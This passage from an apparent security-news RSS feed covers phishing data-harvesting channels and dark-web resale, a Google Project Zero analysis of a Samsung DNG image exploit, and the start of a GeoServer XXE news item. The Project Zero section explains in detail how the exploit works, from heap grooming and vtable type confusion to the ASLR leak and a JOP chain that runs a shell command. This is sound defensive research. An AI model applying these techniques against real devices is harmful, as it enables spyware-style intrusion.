script used to send stolen data specifies a Telegram API URL with a bot token and the corresponding Chat ID, rather than an email address. In some cases, the link is hard-coded directly into the phishing HTML form. Attackers create a detailed message template that is sent to the bot after a successful attack. Here is what this looks like in the code:Code snippet for data submissionCompared to sending data via email, using Telegram bots provides phishers with enhanced functionality, which is why they are increasingly adopting this method. Data arrives in the bot in real time, with instant notification to the operator. Attackers often use disposable bots, which are harder to track and block. Furthermore, their performance does not depend on the quality of phishing page hosting.Automated administration panelsMore sophisticated cybercriminals use specialized software, including commercial frameworks like BulletProofLink and Caffeine, often as a Platform as a Service (PaaS). These frameworks provide a web interface (dashboard) for managing phishing campaigns.Data harvested from all phishing pages controlled by the attacker is fed into a unified database that can be viewed and managed through their account.Sending data to the administration panelThese admin panels are used for analyzing and processing victim data. The features of a specific panel depend on the available customization options, but most dashboards typically have the following capabilities:Sorting of real-time statistics: the ability to view the number of successful attacks by time and country, along with data filtering optionsAutomatic verification: some systems can automatically check the validity of the stolen data like credit cards and login credentialsData export: the ability to download the data in various formats for future use or saleExample of an administration panelAdmin panels are a vital tool for organized cybercriminals.One campaign often employs several of these data harvesting methods simultaneously.Sending stolen data to both an email address and a Telegram botThe data cybercriminals wantThe data harvested during a phishing attack varies in value and purpose. In the hands of cybercriminals, it becomes a method of profit and a tool for complex, multi-stage attacks.Stolen data can be divided into the following categories, based on its intended purpose:Immediate monetization: the direct sale of large volumes of raw data or the immediate withdrawal of funds from a victim’s bank account or online wallet.
Banking details: card number, expiration date, cardholder name, and CVV/CVC.Access to online banking accounts and digital wallets: logins, passwords, and one-time 2FA codes.Accounts with linked banking details: logins and passwords for accounts that contain bank card details, such as online stores, subscription services, or payment systems like Apple Pay or Google Pay.Subsequent attacks for further monetization: using the stolen data to conduct new attacks and generate further profit.
Credentials for various online accounts: logins and passwords. Importantly, email addresses or phone numbers, which are often used as logins, can hold value for attackers even without the accompanying passwords.Phone numbers, used for phone scams, including attempts to obtain 2FA codes, and for phishing via messaging apps.Personal data: full name, date of birth, and address, abused in social engineering attacksTargeted attacks, blackmail, identity theft, and deepfakes.
Biometric data: voice and facial projections.Scans and numbers of personal documents: passports, driver’s licenses, social security cards, and taxpayer IDs.Selfies with documents, used for online loan applications and identity verification.Corporate accounts, used for targeted attacks on businesses.We analyzed phishing and scam attacks conducted from January through September 2025 to determine which data was most frequently targeted by cybercriminals. We found that 88.5% of attacks aimed to steal credentials for various online accounts, 9.5% targeted personal data (name, address, and date of birth), and 2% focused on stealing bank card details.Distribution of attacks by target data type, January–September 2025 (download)Selling data on dark web marketsExcept for real-time attacks or those aimed at immediate monetization, stolen data is typically not used instantly. Let’s take a closer look at the route it takes.Data is consolidated and put up for sale on dark web markets in the form of dumps: archives that contain millions of records obtained from various phishing attacks and data breaches. A dump can be offered for as little as $50. The primary buyers are often not active scammers but rather dark market analysts, the next link in the supply chain.Dark market analysts filter the data by type (email accounts, phone numbers, banking details, etc.) and then run automated scripts to verify it. This checks validity and reuse potential, for example, whether a Facebook login and password can be used to sign in to Steam or Gmail. Data stolen from one service several years ago can still be relevant for another service today because people tend to use identical passwords across multiple websites. Verified accounts with an active login and password command a higher price at the point of sale.
Analysts also focus on combining user data from different attacks. Thus, an old password from a compromised social media site, a login and password from a phishing form mimicking an e-government portal, and a phone number left on a scam site can all be compiled into a single digital dossier on a specific user.Selling on specialized marketsStolen data is typically sold on dark web forums and via Telegram. The instant messaging app is often used as a storefront to display prices, buyer reviews, and other details.Offers of social media data, as displayed in TelegramThe prices of accounts can vary significantly and depend on many factors, such as account age, balance, linked payment methods (bank cards, online wallets), 2FA authentication, and service popularity. Thus, an online store account may be more expensive if it is linked to an email, has 2FA enabled, and has a long history, with a large number of completed orders. For gaming accounts, such as Steam, expensive game purchases are a factor. Online banking data sells at a premium if the victim has a high account balance and the bank itself has a good reputation.The table below shows prices for various types of accounts found on dark web forums as of 2025*.Games and gaming platforms*Data provided by Kaspersky Digital Footprint IntelligenceHigh-value target selection and targeted attacks
Cybercriminals take particular interest in valuable targets. These are users who have access to important information: senior executives, accountants, or IT systems administrators.Let’s break down a possible scenario for a targeted whaling attack. A breach at Company A exposes data associated with a user who was once employed there but now holds an executive position at Company B. The attackers analyze open-source intelligence (OSINT) to determine the user’s current employer (Company B). Next, they craft a sophisticated phishing email to the target, purportedly from the CEO of Company B. To build trust, the email references some facts from the target’s old job – though other scenarios exist too. By disarming the user’s vigilance, cybercriminals gain the ability to compromise Company B for a further attack.Importantly, these targeted attacks are not limited to the corporate sector. Attackers may also be drawn to an individual with a large bank account balance or someone who possesses important personal documents, such as those required for a microloan application.The journey of stolen data is like a well-oiled conveyor belt, where every piece of information becomes a commodity with a specific price tag. Today, phishing attacks leverage diverse systems for harvesting and analyzing confidential information. Data flows instantly into Telegram bots and attackers’ administration panels, where it is then sorted, verified, and monetized.It is crucial to understand that data, once lost, does not simply vanish. It is accumulated, consolidated, and can be used against the victim months or even years later, transforming into a tool for targeted attacks, blackmail, or identity theft. In the modern cyber-environment, caution, the use of unique passwords, multi-factor authentication, and regular monitoring of your digital footprint are no longer just recommendations – they are a necessity.If a bank card you hold has been compromised, call your bank as soon as possible and have the card blocked.If your credentials have been stolen, immediately change the password for the compromised account and any online services where you may have used the same or a similar password. Set a unique password for every account.Enable multi-factor authentication in all accounts that support this.Check the sign-in history for your accounts and terminate any suspicious sessions.If your messaging service or social media account has been compromised, alert your family and friends about potential fraudulent messages sent in your name.Use specialized services to check if your data has been found in known data breaches.Treat any unexpected emails, calls, or offers with extreme vigilance – they may appear credible because attackers are using your compromised data.]]></content:encoded></item><item><title>A look at an Android ITW DNG exploit</title><link>https://projectzero.google/2025/12/android-itw-dng.html</link><author>Benoît Sevens, Google Threat Intelligence Group</author><category>research</category><pubDate>Fri, 12 Dec 2025 10:00:00 +0000</pubDate><source url="https://projectzero.google/">Google Project Zero</source><content:encoded><![CDATA[Between July 2024 and February 2025, 6 suspicious image files were uploaded to VirusTotal. Thanks to a lead from Meta, these samples came to the attention of Google Threat Intelligence Group.Investigation of these images showed that these images were DNG files targeting the Quram library, an image parsing library specific to Samsung devices.On November 7, 2025 Unit 42 released a blogpost describing how these exploits were used and the spyware they dropped. In this blogpost, we would like to focus on the technical details about how the exploits worked. The exploited Samsung vulnerability was fixed in April 2025.There has been excellent prior work describing image-based exploits targeting iOS, such as Project Zero’s writeup on FORCEDENTRY. Similar in-the-wild “one-shot” image-based exploits targeting Android have received less public documentation, but we would definitely not argue it is because of their lack of existence. Therefore we believe it is an interesting case study to publicly document the technical details of such an exploit on Android.
The VirusTotal submission filenames of several of these exploits indicated that these images were received over WhatsApp:IMG-20240723-WA0000.jpg

The first filenames listed follow the naming scheme of WhatsApp on Android. The last filename is how WhatsApp Web names image downloads.The first two images were received on the same day, based on the filename, potentially by the same target. Later analysis showed that the first image targets the jemalloc allocator, while the second one targets the scudo allocator, used on more recent Android versions. This blogpost will detail the scudo version of the exploit as this allocator is more hardened and relevant for recent devices. The concepts and techniques used in the jemalloc version are similar.The final payload (as we’ll see later) indicates that the exploit expects to run within the  process. How are WhatsApp and  related and what is this process?The  process is a Samsung-specific system service responsible for providing “intelligent” or AI-powered features to other Samsung applications. It will periodically scan and parse images and videos in Android’s .When WhatsApp receives and downloads an image, it will insert it in the . This means that downloaded WhatsApp images (and videos) can hit image parsing attack surface within the  application.However, WhatsApp does not intend to automatically download images from untrusted contacts. (WhatsApp on Android’s logic is a bit more nuanced though. More details can be found in Brendon Tiszka’s report of a different issue). This means that without additional bypasses and assuming the image is sent by an untrusted contact, a target would have to click the image to trigger the download and have it added to the MediaStore. This would mean this is in fact a “1-click” exploit. We don’t have any knowledge or evidence of the attacker using such a bypass though.Before we delve into the exploit, let’s gather an understanding of what type of file we are looking at.$ file "WhatsApp Image 2025-02-10 at 4.54.17 PM.jpeg"

(We truncated the “Opcode List” lines, since they contained thousands of opcodes in the actual  output.)Although the image was saved with a  extension, this image is in fact a Digital Negative (DNG) image. According to Wikipedia:Digital Negative (DNG) is an open source, lossless, well defined camera RAW data container with the goal to replace a range of proprietary, closed source raw image containers. It has been developed by Adobe.DNG is based on the TIFF/EP standard format, and mandates significant use of metadata. The specification of the file format is open and not subject to any intellectual property restrictions or patents.The image width and height look suspiciously small. And what are these opcode lists?DNG files use SubIFD trees, as described in the TIFF-EP specification, in order to contain multiple versions of the same image, such as a preview and a main image. This DNG file has 3 SubIFDs:Type “Preview Image” with width 1 and length 1Type “Main Image” with width 16 and length 16Type “Main Image” with width 1 and length 1As we mentioned already briefly, the sizes of these images are obviously very suspicious, as well as the fact that there are 2 “Main Image” types. We have not figured out what the purpose of the second main image is (if any).DNG images can contain 3 “opcode lists”. As it will turn out, these “opcodes” will be very important in the context of this exploit. Their goal is to offload some processing steps from the camera to the DNG reader. Their intended use case is for example to perform lens corrections. The reason there are 3 opcode lists is because they are intended to be applied at different moments during the DNG decoding:The raw image bytes are read from the DNG file, a.k.a. the “stage 1” image
    Opcode list 1 specifies the list of opcodes that should be applied to the stage 1 imageThe DNG decoder maps the raw image bytes to linear reference values, which results in a “stage 2” image.
    Opcode list 2 specifies the list of opcodes that should be applied to the stage 2 imageThe DNG decoder performs demosaicing of the linear reference values, which results in a “stage 3” image.
    Opcode list 3 specifies the list of opcodes that should be applied to the stage 3 image.Every opcode has an opcode ID and varying number and type of parameters. The latest specification (1.7.1.0 from September 2023), contains 14 distinct opcodes, with opcode IDs going from 1 to 14. Below is an example of opcode description found in the specification:For this exploit, only 3 opcodes will be of interest: (opcode ID 6): This opcode trims the image to a specified rectangle. (opcode ID 7): This opcode maps a specified area and plane range of an image through a 16-bit lookup table. (opcode ID 11): This opcode applies a per-column delta (constant offset) to a specified area and plane range of an image. and  perform transformations on areas (defined by a top, left, bottom and right parameter) and plane ranges (defined by a first plane and number of planes parameter).Looking at the opcode lists in the  output above, we already notice some suspicious things:They use opcodes with opcode ID 23 (which  can not map to an opcode name).Typical benign DNG images will contain only a handful of opcodes, while for this image we have thousands of opcodes in the opcode lists.As we mentioned before, the targeted process based on the payload is the Samsung firmware specific . The next question then becomes what code in this application performs the DNG decoding.Looking at a decompiled  APK (which on our test phone was located at /system/priv-app/IPService/IPService.apk), we can see that when the application parses a file with an extension of “jpg”, “jpeg”, “JPG” or “JPEG”, it will call into the Java method com.quramsoft.images.QrBitmapFactory.decodeFile (bundled in the same APK).The “Quram library” is a set of proprietary, closed-source software libraries used by Samsung on its Android devices. Its primary function is to process, parse, and decode various image formats. The library is not developed by Samsung itself. It is created by a third-party software vendor named Quramsoft. Mateusz Jurczyk already wrote about this library in 2020.The QrBitmapFactory.decodeFile method will first try to decode the image using QuramBitmapFactory.decodeFile (see [1]), which calls the exported Java_com_quramsoft_images_QuramBitmapFactory_nativeDecodeFile2 function of the native library . This function handles formats such as PNG, JPEG and GIF, but not DNG. This native library is not part of the  APK but rather located at /system/lib64/libimagecodec.quram.so.When QuramBitmapFactory.decodeFile fails, QrBitmapFactory.decodeFile calls QuramDngBitmap.decodeFile as a fallback (see [2]), which then calls Java_com_quramsoft_images_QuramDngBitmap_DecodeDNGImageBufferJNI. This function will perform the complete DNG decoding and it is within this code path the vulnerability is triggered and the exploit fully executes.The call sequence is summarized below:com.quramsoft.images.QrBitmapFactory.decodeFile (com.samsung.ipservice.apk)
|_ com.quramsoft.images.QuramBitmapFactory.decodeFile (com.samsung.ipservice.apk)

A few tools came in handy when analysing this exploit, which we’ll describe next.First of all, on the static analysis side, we need an overview of the different opcodes that are called with their parameters.  only gives us a list of the (translated) opcode IDs. To inspect every opcode with its parameters, we can use the  tool provided by Adobe’s DNG SDK with the  flag. It will parse the opcode lists and we can post-process its textual output to make sense of the thousands of opcodes. Here is a snippet of what the output looks like, showing us the different parameters of a few  and  opcodes....

On the dynamic analysis side, debugging  would be very annoying, since it only runs periodically (although there are tricks to force start it). For easier debugging, we reused @flankerhqd’s fuzzing harness (in part based on Project Zero’s SkCodecFuzzer), which loads a DNG file provided as a filename into a buffer and passes it to ’s . We compile it as a standalone binary and can run it under a debugger.It is noteworthy that  (used in our harness) is not the export called by  (which ends up calling ). However, if there is no preview image available with one of the JPEG compression types,  will call QuramDngDecoder::decodePreview, which will also perform a full DNG decoding and successfully triggers the vulnerability and exploit.Our test phone was a Samsung Galaxy S21 5G (SM-G991B) running firmware version G991BXXSAFXCL, which has a security patch level of 2024-04-01.Using the  tool we can make a listing of the sequence of opcodes called and their number of repetitions:$ grep Opcode dng_validate.out  | uniq -c

The specification mentions that if the flag bit is set (which it is), opcodes with unknown opcode IDs should be skipped. So let’s for the moment ignore the “Unknown” opcodes with ID 23 (more on them later).Let’s look at the first 2 known opcodes, which occur in opcode list 3:$ grep -A8 TrimBounds dng_validate.out  | head -n 8

The DNG opcode parameters are embedded directly in the file. DeltaPerColumn takes a list of deltas to be applied to each pixel and the “Area Spec” to work over: top, left, right, bottom coordinates, the plane and total number of planes being targeted, and the length of each row and column (rowPitch and colPitch). These values are controllable by the attacker.The “first plane” (5125) and “number of planes” (5123) parameters of the  opcode are very suspicious. At stage 3 in the DNG decoding, the number of planes will be 3 (R, G and B), as can be seen in the CFA related data of the  output. The first value (5125) is the first plane to apply the DeltaPerColumn to, while the second value (5123) is the number of planes. Since the planes are numbered 0 to 2, these values are clearly out of bounds.Let’s have a look at QuramDngOpcodeDeltaPerColumn::processArea, which is the handler for the  opcode. Below are the relevant lines of that function for the vulnerability. (Variable names are chosen by us since this is a closed source library)The function takes a few objects with Quram specific structure as arguments. The  describes the image on which the opcode is to be applied (which is the stage 3 image at this point). The  contains the  parameters. The function has a triple nested loop to iterate over the width, length and planes of the area. For every such triplet (width,length,plane) it calculates the offset in the raw pixel buffer and adds a delta to it. Only the plane loop is relevant for the bug and displayed in the code above.Below is an example of a 6x6 image with its different color planes and to what offsets the pixel values map in the raw pixel buffer. During stage 2 and stage 3 image processing, each pixel value in each color plane takes 16 bits.
There are two issues in that handler function: is calculated incorrectly. It should be opcode_first_plane + opcode_number_of_planes (as will be the case in the patched version). This by itself is a correctness issue (and a pretty basic one that would be expected to surface by normal usage or testing of the library).The plane used in the offset calculation is bounded by , but at no point is it checked that  is within the number of planes that the image contains.The actual values from the exploit are annotated as comments in the code snippet. With these values, the plane loop will be executed exactly once. The width and length loop will also be executed only once, since . This means exactly one write will happen. Since the stage 3 image in the exploit has a width 1 and length 1, the write will happen at offset 5125 x 2 = 10250 from the raw pixel buffer.Not only the offset of the write is controlled, the value to be added to the current value in the raw pixel buffer is also fully controlled, since it is an opcode parameter. In this case it is 26214.0 (or 0x6666). This vulnerability gives thus a very strong primitive from the start: the attacker can add chosen values at chosen offsets with respect to the raw pixel buffer.Now why do we need that TrimBounds opcode before triggering the bug? That will become clear when we discuss the heap shaping strategy.Since the buffers containing the pixel values are dynamically allocated on the heap, it is important to understand what heap allocations the Quram library makes and how these allocations behave to understand the heap layout at the time of the vulnerability triggering.As we mentioned earlier, exploits exist for Android versions using both jemalloc and scudo allocator. We will analyse the exploit targeting the scudo allocator, since this is the common allocator on modern Android versions. The same techniques were used in a different way in the jemalloc exploit.We will not give a detailed overview of Android’s scudo allocator, which is being used here for the allocations, since excellent documentation by Synacktiv already exists, to which we refer. We will only mention the elements that are important for this exploit.Scudo allocates objects in different heap regions depending on the allocation size. For two objects of different types to land near each other, they need to belong to the same size class. The size required from the allocator’s point of view for a “block” is composed of:The chunk with the user requested size. A pointer to the chunk is returned to the caller.New allocations are retrieved via “transfer batches”. The number of allocations in a transfer batch depends on the size class. For the size we will be interested in (chunks of 0x30 bytes, i.e. blocks of 0x40 bytes), there are 52 allocations in a transfer batch. The allocations within a transfer batch are returned in a randomized order, however subsequent transfer batches are just laid out linearly in memory. A consequence of this is that given enough allocations between two allocations of the same size, an attacker can be confident that the last allocation falls after the first allocation.Lastly, scudo supports a quarantine mechanism that prevents freed allocations to be returned immediately on a next allocation request. However on Android this quarantine mechanism is disabled. The consequence is that a freed object will be directly reallocated on the next allocation request of the same size.With a basic understanding of scudo’s allocation behaviour, let’s look at the specific heap allocations Quram makes when decoding a DNG file.First, when Quram parses the opcode lists in the DNG file, it will allocate one  object per opcode. These objects contain the parameters of the opcode, as well as a vtable pointer to the handlers for that opcode. The size of such an object depends thus on the number and type of parameters and hence on the type of opcode. The size of the different opcodes can be looked up in QuramDngDecoder::makeDngOpcode. For the exploit at hand, only the following opcode sizes are relevant: (opcode ID 11): 0x50 bytes (opcode ID 7): 0x50 bytes (opcode ID 6): 0x30 bytes (starting at opcode ID 14, such as opcode ID 23 in the exploit): 0x30 bytesThis means  and  opcodes will land in the same heap region, distinct from the heap region containing the  and  opcodes.Next, for every stage image, Quram will allocate three heap buffers:A  of fixed size 0x30, which describes the imageA buffer for the pixel values of variable size (depending on width, height and number of planes)A  of fixed size 0x40, which describes the contents of the bufferThese different objects and their relationship are illustrated below:

There are two “pixel buffers” at play here, which can be a bit confusing: the  object and the raw buffer with pixel values. In what comes, when we talk about “raw pixel buffer”, we refer to the latter. and  will land in different heap regions since they belong to different scudo allocation class sizes. The raw pixel buffer may end up in the same heap region as a  depending on its size. Its size is calculated by . For the dimensions of the stage 3 image of the exploit (width 1 by length 1 with 3 color planes) it will calculate a size of 0x30 bytes (even though 6 bytes would suffice). For the stage 1 and stage 2 images, the sizes are different and will be allocated in a different heap region.To conclude, both the  opcodes, the  opcodes, the  objects as well as potentially the raw pixel buffer will end up in the same heap region.We can now study the sequence of events during DNG decoding to understand the heap layout at the time of the vulnerability trigger:QuramDngDecoder::getRegionStage1Image will allocate a “stage 1” QuramDngImage (size 0x30)QuramDngDecoder::readStage1Image parses the 3 opcode lists and allocates a QuramDngOpcode structure per opcode. As we saw, only  and  opcodes will land in the same heap region of 0x30 bytes chunks, which is of interest to us. Other opcodes are allocated in different heap regions.$ grep -E 'OpcodeList|TrimBounds|Unknown' dng_validate.out  | uniq -c

QuramDngDecoder::buildStage2Image will apply opcode list 1. When it is done, the 20000 unknown opcodes it contains are freed.QuramDngDecoder::doBuildStage2 will allocate a  “stage 2” (size 0x30) and convert stage 1 to stage 2. This stage 2 image will take the spot of the last opcode of opcode list 1 that was freed.QuramDngDecoder::buildStage2Image can now free the “stage 1” . It will then process the opcode list 2, and free the 240 “unknown” opcodes.QuramDngDecoder::doInterpolateStage3 will allocate both a new “stage 3”  (size 0x30) and subsequently a raw pixel buffer of size 0x30. These will take the spots of the last 2 opcodes freed from opcode list 2 in the previous step.QuramDngDecoder::buildStage3Image can now free the “stage 2” .Opcode list 3 gets processed now. In the first  opcode, QuramDngOpcodeTrimBounds::doApply will allocate a new raw pixel buffer of size 0x30 (although the replaced raw pixel buffer has the exact same size). This allocation will take the spot of the freed stage 2 image.
    Note that the 640 other  opcodes have a “minVersion” of 1.4.0.1. This is a trick that will make QuramDngOpcode::aboutToApply bail out early and not have the  actually executed. The goal of spraying these 640  opcodes will become clear later.The eventual heap layout for chunks of size 0x30 is illustrated below. The annotated offsets will be important later on.
Note that because of scudo’s randomization strategy, the allocations of different opcode lists will actually overlap slightly (on the order of 52 allocations), but given enough allocations this effect can be neglected.Because the allocations have chunk sizes of 0x30 bytes, they take up 0x40 bytes on the heap. Different chunks in this heap region are thus spaced by multiples of 0x40 bytes, which will help us in quickly inferring what parts of an object are being corrupted. The illustration also depicts the sizes the allocations occupy in total, which will be important for understanding the subsequent exploitation flow.As we’ll see, the exploit will write out of bounds from the raw pixel buffer of stage 3 into the QuramDngImage of stage 3. This explains why the attackers first used a TrimBounds opcode before triggering the bug: it assures that the raw pixel buffer will end up  the . Without it, there would be a one out of two chance that the raw pixel buffer takes a spot  the QuramDngImage.After achieving the right heap layout using the , 480  opcodes follow. As a reminder, these are allocated in a different heap region because of a different allocation size. As discussed,  opcodes are able to add arbitrary values to arbitrary offsets out of bounds. The attackers add 0x6666 to offsets 10 and 12 within 240 heap objects, starting at offset 0x2800 from the raw pixel buffer and ending at offset 0x6400.Looking at our heap layout, we will corrupt three types of objects at these offsets: and  opcodes: opcode structures contain the opcode ID at offset 8 and the specification version at offset 12. Since the opcode IDs will be corrupted, these  and  opcodes will simply be skipped later on (which was already the case for the  opcodes).Before:

Most importantly, it will encounter the  object. The two corrupted fields of this object are the “bottom” and “right” fields of the image, which are used in other opcode handlers for verifying if operations are within bounds. This means that we can now use other opcodes, such as MapTable, to perform actions out of bounds.Before:

If we look for example at the first MapTable that follows, it looks like:Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
AreaSpec: t=0, l=5120, b=1, r=5121, p=0:1, rp=1, cp=1
Count: 65536
Under regular circumstances, the “left” and “right” value would be out of bounds and this opcode would not perform any operation. Because we corrupted the dimensions of the QuramDngImage though, this opcode will operate out of bounds.Incrementing arbitrary out of bound values with chosen values is a powerful primitive, but the exploit will also want to write absolute arbitrary values out of bounds. The former can be converted pretty easily into the latter though.If we have a primitive to write zeros out of bounds, we can combine that with the increment primitive to write arbitrary values in two steps: zero the memory and then increment it with the value we want to write.Zeroing memory can be done in two ways, and both are used in the exploit:Using the  opcode with a substitution table of all zerosUsing the  opcode. The “Delta” parameter is a float, and -Infinity is supported, which sets the resulting value to 0.In the exploit,  is only used to zero large regions, likely because of the large space overhead of the  opcode (as it requires a substitution table of 65536 values to be included).Crafting a bogus MapTable opcodeWith linear out-of-bounds write primitive in place, the exploit could now:Write a shell command somewhere out of boundsWrite a JOP gadget chain somewhere out of bounds which ends up calling Overwrite the vtable pointer of one of the opcode objects to be executed to kick off the JOP chain, resulting in a  executionThere is one important issue though: we don’t know any of the required addresses, since both the heap and the libraries are subject to ASLR. To leak the addresses of the JOP gadgets, the exploit has to do a bit more work.Let’s show the first  opcode again:Opcode: MapTable, minVersion = 1.4.0.0, flags = 1
AreaSpec: t=0, l=5120, b=1, r=5121, p=0:1, rp=1, cp=1
Count: 65536
This opcode will act on offset 5120 x 2 bytes/pixel x 3 colors/pixel = 0x7800 from the raw pixel buffer, which is in the region of those 641 TrimBounds opcodes.
It is corrupting the lower 2 bytes of the vtable pointer of a  opcode object. Looking at the substitution table, most values are mapped to itself, however a few are not. (We had to write an additional script to parse this out, since ’s output of these long substitution tables is truncated).
For example, the value 0xecf0 is mapped to 0xed30. Looking at the  binary, the new address points to the  vtable. This trick allows the attackers to “type confuse” a  opcode to a  opcode, by moving the vtable pointer to a different one, without having to leak any ASLR first.Their substitution table supports different versions of the library, which works because there are not that many versions of the library (the exploit supports 7 versions) and the lower bytes of the vtable do not collide. Moreover, since ASLR is applied at page level granularity, they need to account for every page multiple the vtable can be mapped at. Say we have the following vtable offsets: version x version y vtable offset vtable offsetThen the following  substitution table would be constructed (omitting values that don’t matter and can map to whatever):index  : value
0x0cf0 : 0x0d30
0x0e10 : 0x0e50
0x1cf0 : 0x1d30
0x1e10 : 0x1e50

Using the previously described arbitrary write primitive, the exploit also corrupts various fields of the  object to transform it into a functional bogus  object. Note that a regular  opcode object is bigger than a  opcode and would hence also land in a different scudo heap class in normal circumstances. Obviously, the library is unaware and will just read opcode arguments out of bounds in this case.The constructed bogus  opcode object looks like this:

                                  as the pointer to the MapTable's substitution table 
The whole goal of this construction is to have the vtable of another opcode object as the pointer for the MapTable substitution table. If we zero out the memory this MapTable will be applied to beforehand, this will result in a read of two bytes from the TrimBounds vtable, i.e. a leak./-< Zero'ed memory at offset 0xf000:                   0000 0000 0000 0000 0000 ...

\-> Transformed memory at offset 0xf000:               04b2 04b2 04b2 04b2 04b2 ....
Leaking interesting pointersUsing the above technique, we can leak arbitrary values at offsets from the TrimBounds vtable. We demonstrated this for offset 0, but the same idea can be applied for other offsets (up to 65536, the maximum index into the substitution table).Say you want to leak a pointer at offset 0x1f8 from the TrimBounds vtable. This can be achieved in the following way:/-< Prepared memory at offset 0xf000:                                   f001 f101 f201 f301 ...
|
|-< MapTable substitution table (TrimBounds vtable) at offset 0x1f0:    4c5a ebcc 7f00 0000 ....
|
\-> Transformed memory at offset 0xf000:                                4c5a ebcc 7f00 0000 ....
But again, the exploit needs to support different library versions. These different library versions have pointers to leak at different offsets from the vtable. But based on the first leak at offset 0, we can “calculate” the right offsets to leak using another  operation.In summary the process goes as follows (illustrated below):Corrupt a  opcode into a  object with the substitution table pointing at the  vtable.Have the bogus  opcode process an area of all zeros. The substituted values will be the lower 2 bytes of the first vtable entry (which is the address of QuramDngOpcode::~QuramDngOpcode()). The top nibble will depend on the ASLR slide, and the lower 3 nibbles will be version dependent.Using  opcodes with well prepared substitution tables (supporting different ASLR slides and library versions), substitute those values to the offset between the  vtable and the address of the pointer to leak.Similar to step 1, corrupt another TrimBounds opcode into a MapTable object with the substitution table pointing at the TrimBounds vtable.The bogus  will now substitute the offsets from the vtable into their respective values, effectively writing a leaked pointer into memory.The memory used for preparing these pointers is at offset 0xf000 from the raw pixel buffer, which contains the last series of 1040 “unknown” opcodes. This memory will become the JOP chain.The leaked pointers are mostly pointers to functions inside , as well as the value of libc’s , which is located in the GOT. Conveniently the .got segment is located after the ’s vtable, and within a 65536 bytes offset.By using more MapTable operations, we can change the leaked pointers to the JOP gadget addresses we are interested in. The leaked libc pointer is changed to the address of .This is an overview of the leaked pointers and to what they are changed:Remapped value for JOP chainQuramDngFunctionExposureRamp::~QuramDngFunctionExposureRamp()qpng_check_fp_number@got.pltQuramDngFunctionExposureRamp::evaluate(double)QuramDngException::~QuramDngException()__ink_jpeg_enc_process_image_data+64QuramDngException::~QuramDngException()__ink_jpeg_enc_process_image_data+64QuramDngFunctionExposureRamp::evaluate(double)__system_property_get_ptrA long shell command is also prepared at offset 0x10000 from the raw pixel buffer, which also falls in that 1040  opcodes region.a JOP chain prepared at 0xf000. Note that it is preceded by one of the 1040  opcodes with opcode ID 23 (0x17)a shell command at offset 0x10000. Note again how it is within the region of the  opcodesSimilar to our initial corruption, we increment values between 0x2800 and 0x6400 with 1, but this time at offset 0x22 within the objects, using  opcodes. The opcode objects there have been executed by now, so this does not affect them. However, the  is also there and offset 0x20 in the QuramDngImage is a pointer to the raw pixel buffer. By adding 1 to offset 0x22, we basically shift the raw pixel buffer pointer with 0x10000 bytes, pointing it right at the shell command.Finally, the DNG decoder will execute that last series of 1040 “unknown” opcodes. Offset 0xf000 - where we prepared our JOP chain - falls nicely on the boundary of one of those opcodes, so it will be executed as another opcode.QuramDngOpcode::aboutToApply reads the bogus vtable pointer at raw pixel buffer offset 0xf000 and calls the fourth function in it, which will be ..got:00000000002E3390 qpng_check_fp_number_ptr DCQ qpng_check_fp_number  // address of vtable placed at offset 0xf000

In September 2025, a CVE was assigned (CVE-2025-21042) by Samsung and the security bulletin updated. Note that not all supported Samsung devices are serviced monthly security updates. Some devices are part of a quarterly or biannual security update schedule, which means they might have received the fix at a later date. On December 11, 2025, Samsung told us the following: “patches for SVE-2025-1959 have been deployed to all devices supported by Security Update, without exception.”The fixed function now looks like below (simplified version). The bold parts are the added checks.As we can see from the fix:The  is now calculated correctly.Before dereferencing the raw pixel buffer, a check is performed that the  is within the number of planes of the image.Except for some ASLR bypassing tricks and a little bit of JOP work, no mitigations posed a significant hurdle for the attackers:No control flow integrity mitigations, like PAC or BTI, are compiled into the Quram library. This allowed the attackers to use arbitrary addresses as JOP gadgets and construct a bogus vtable.The “hardened” scudo allocator wasn’t an obstacle either. The heap spraying primitives - more or less inherent to the DNG format - are quite powerful and allow for a well predicted heap layout, even in the presence of scudo’s randomization strategy. The absence of the quarantine feature is also convenient to deterministically reclaim the spot of the stage 2 image.MTE would likely have prevented both:the initial vulnerability trigger to corrupt the image dimensionsthe hundreds of subsequent out of bounds  and  operationspreventing reliable exploitation of this vulnerability, at least with the current exploit strategy.This case illustrates how certain image formats provide strong primitives out of the box for turning a single memory corruption bug into interactionless ASLR bypasses and remote code execution. By corrupting the bounds of the pixel buffer using the bug, the rest of the exploit could be performed by using the “weird machine” that the DNG specification and its implementation provide.The bug exploited in this case is quite shallow and could have been found manually or through fuzzing. As Project Zero’s Reporting Transparency illustrates, several other vulnerabilities in the same component have been discovered.These types of exploits do not need to be part of long and complex exploit chains to achieve something useful for attackers. By finding ways to reach the right attack surface and using a single vulnerability, attackers are able to access all the images and videos of an Android’s media store, which is a very interesting capability for spyware vendors.I would like to thank everyone who contributed to this analysis:Meta for the initial leadsBrendon Tiszka of Google Project Zero for the research on how the  attack surface can be reached and the followup research he performed into the Quram library, leading to several more discoveries.Clement Lecigne of Google Threat Intelligence Group for assisting in the analysis]]></content:encoded></item><item><title>CISA orders feds to patch actively exploited Geoserver flaw</title><link>https://www.bleepingcomputer.com/news/security/cisa-orders-feds-to-patch-actively-exploited-geoserver-flaw/</link><author>Sergiu Gatlan</author><category>security</category><pubDate>Fri, 12 Dec 2025 09:48:31 +0000</pubDate><source url="https://www.bleepingcomputer.com/">BleepingComputer</source><content:encoded><![CDATA[CISA has ordered U.S. federal agencies to patch a critical GeoServer vulnerability now actively exploited in XML External Entity (XXE) injection attacks.

